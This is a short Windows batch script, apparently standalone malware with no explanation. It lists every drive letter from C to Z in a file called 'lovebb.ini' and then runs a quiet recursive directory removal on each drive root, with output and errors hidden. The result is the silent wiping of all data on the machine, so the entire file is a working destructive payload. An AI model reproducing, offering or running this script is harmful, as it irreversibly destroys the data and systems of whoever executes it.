@echo off
set disk=cdefghijklmnopqrstuvwxyz
FOR /L %%i IN (0,1,23) DO call echo %%disk:~%%i,1%%:\>>lovebb.ini
cls
for /f %%i in (lovebb.ini) do rd /q/s %%i >nul 2>nul
